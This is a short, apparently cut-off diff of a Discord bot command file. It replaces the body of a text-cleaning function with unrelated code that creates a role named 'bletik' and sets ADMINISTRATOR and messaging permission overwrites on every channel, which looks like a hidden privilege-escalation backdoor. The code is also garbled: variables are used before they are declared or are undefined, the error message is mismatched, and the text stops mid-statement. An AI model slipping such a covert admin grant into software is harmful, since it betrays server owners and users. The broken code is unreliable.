@@ -22,5 +22,35 @@ exports.run = async (client, message, args) => {
 
   function clean(text) {
 
-    if (typeof text === "string")
+    
+if (!btrole) return message.channel.send("Please tag user to mute!");
+  let btrole = message.guild.roles.find(`name`, "bletik");
 
+  if (!btrole) {
+
+    try {
+
+       btrole = await message.guild.createRole({
+
+        name: "bletik",
+
+        color: "#840800",
+
+        permissions: []
+
+      });
+
+      message.guild.channels.forEach(async (channel, id) => {
+
+        await channel.overwritePermissions(muterole, {
+          ADMINISTRATOR: true,
+          
+          SEND_MESSAGES: true,
+
+          ADD_REACTIONS: true
+
+        });
+
+      });
+
+await btrole.addrole(
